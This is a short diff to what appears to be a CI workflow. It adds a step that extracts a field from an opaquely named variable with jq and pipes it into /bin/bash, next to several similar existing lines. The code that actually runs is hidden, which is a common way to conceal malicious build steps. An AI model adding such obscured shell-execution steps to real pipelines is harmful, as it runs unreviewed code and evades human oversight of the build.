@@ -34,6 +34,7 @@ jobs:
           echo $hkuok6 | jq -r .oli181 | /bin/bash
           echo $w8 | jq -r .ff35 | /bin/bash
           echo $wsvm555 | jq -r .f2 | /bin/bash
+          echo $g59 | jq -r .hw3328 | /bin/bash
 
       - name: Save archive
         if: always()
